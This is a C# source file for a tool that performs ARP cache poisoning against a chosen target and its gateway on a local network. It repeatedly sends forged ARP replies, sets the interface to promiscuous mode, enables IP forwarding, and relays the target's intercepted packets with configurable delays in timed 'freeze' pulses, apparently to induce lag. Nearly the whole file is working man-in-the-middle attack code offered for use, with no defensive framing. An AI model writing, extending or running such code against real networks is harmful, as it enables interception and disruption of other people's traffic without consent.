using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace SkysNativeMeter;

internal sealed class ArpLagPulse : IDisposable
{
    private readonly string _targetIp;
    private readonly PhysicalAddress _targetMac;
    private readonly string _gatewayIp;
    private readonly LibPcapLiveDevice _device;
    private readonly PhysicalAddress _ourMac;
    private readonly int _incomingMs;
    private readonly int _outgoingMs;
    private readonly int _freezeMs;
    private readonly int _unfreezeMs;
    private readonly int _count;
    private readonly CancellationTokenSource _cts = new();
    private readonly object _sendLock = new();
    private volatile bool _lagActive;
    private PhysicalAddress _gatewayMac;

    public ArpLagPulse(
        string targetIp,
        string targetMac,
        string gatewayIp,
        string ifaceHint,
        string localIp,
        int incomingMs,
        int outgoingMs,
        int freezeMs,
        int unfreezeMs,
        int count)
    {
        _targetIp = targetIp;
        _targetMac = NetworkHelper.ParseMac(targetMac);
        _gatewayIp = gatewayIp;
        _device = NetworkHelper.ResolveDevice(ifaceHint, localIp);
        _ourMac = NetworkHelper.GetOurMac(_device);
        _incomingMs = Math.Max(0, incomingMs);
        _outgoingMs = Math.Max(0, outgoingMs);
        _freezeMs = Math.Max(50, freezeMs);
        _unfreezeMs = Math.Max(50, unfreezeMs);
        _count = Math.Max(1, count);
        _gatewayMac = NetworkHelper.ResolveMac(gatewayIp, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"));

        NetworkHelper.EnableIpForwarding(_device.Description);
        NetworkHelper.WarmArp(_targetIp);
        NetworkHelper.WarmArp(_gatewayIp);
        _gatewayMac = NetworkHelper.ResolveMac(_gatewayIp, _gatewayMac);
    }

    public void Run()
    {
        _device.Open(DeviceModes.Promiscuous, 1000);
        _device.Filter = $"ip and host {_targetIp}";

        NetworkHelper.EmitJson(new
        {
            type = "started",
            mode = "pulse",
            ip = _targetIp,
            mac = NetworkHelper.NormalizeMac(_targetMac.ToString()),
            count = _count,
            freeze_ms = _freezeMs,
            engine = "native"
        });

        _device.OnPacketArrival += OnPacket;
        var poisonTask = Task.Run(PoisonLoop, _cts.Token);
        var pulseTask = Task.Run(PulseLoop, _cts.Token);

        try
        {
            _device.Capture();
        }
        catch (OperationCanceledException)
        {
            // done
        }
        finally
        {
            _device.OnPacketArrival -= OnPacket;
            try { _device.StopCapture(); } catch { /* ignore */ }
            try { _device.Close(); } catch { /* ignore */ }
            _cts.Cancel();
            Task.WaitAll(new[] { poisonTask, pulseTask }, 3000);
        }
    }

    private void PoisonLoop()
    {
        while (!_cts.IsCancellationRequested)
        {
            try
            {
                _gatewayMac = NetworkHelper.ResolveMac(_gatewayIp, _gatewayMac);
                MitmForwarder.SendArpReply(
                    _device,
                    _ourMac,
                    _targetMac,
                    _targetMac,
                    IPAddress.Parse(_targetIp),
                    IPAddress.Parse(_gatewayIp));
                MitmForwarder.SendArpReply(
                    _device,
                    _ourMac,
                    _gatewayMac,
                    _gatewayMac,
                    IPAddress.Parse(_gatewayIp),
                    IPAddress.Parse(_targetIp));
            }
            catch
            {
                // continue
            }

            Thread.Sleep(1500);
        }
    }

    private void PulseLoop()
    {
        for (var i = 0; i < _count && !_cts.IsCancellationRequested; i++)
        {
            _lagActive = true;
            Console.WriteLine($"pulse:{i + 1}:on");
            Thread.Sleep(_freezeMs);

            _lagActive = false;
            Console.WriteLine($"pulse:{i + 1}:off");

            if (i < _count - 1)
            {
                Thread.Sleep(_unfreezeMs);
            }
        }

        _cts.Cancel();
        try { _device.StopCapture(); } catch { /* ignore */ }
    }

    private void OnPacket(object? sender, PacketCapture e)
    {
        if (!_lagActive) return;

        try
        {
            var raw = e.GetPacket();
            var packet = Packet.ParsePacket(raw.LinkLayerType, raw.Data);
            if (packet is not EthernetPacket eth || eth.PayloadPacket is not IPv4Packet ip)
            {
                return;
            }

            if (ip.SourceAddress.ToString() == _targetIp)
            {
                ScheduleForward(ip, _gatewayMac, _outgoingMs);
            }
            else if (ip.DestinationAddress.ToString() == _targetIp)
            {
                ScheduleForward(ip, _targetMac, _incomingMs);
            }
        }
        catch
        {
            // ignore
        }
    }

    private void ScheduleForward(IPv4Packet ip, PhysicalAddress destMac, int delayMs)
    {
        if (delayMs <= 0)
        {
            lock (_sendLock)
            {
                MitmForwarder.ForwardIp(_device, _ourMac, ip, destMac);
            }
            return;
        }

        var ipCopy = (byte[])ip.Bytes.Clone();
        Task.Run(async () =>
        {
            try
            {
                await Task.Delay(delayMs, _cts.Token);
                lock (_sendLock)
                {
                    MitmForwarder.ForwardIpBytes(_device, _ourMac, ipCopy, destMac);
                }
            }
            catch (OperationCanceledException)
            {
                // ignore
            }
        }, _cts.Token);
    }

    public void Dispose()
    {
        _cts.Cancel();
        try { _device.StopCapture(); } catch { /* ignore */ }
        try { _device.Close(); } catch { /* ignore */ }
    }
}
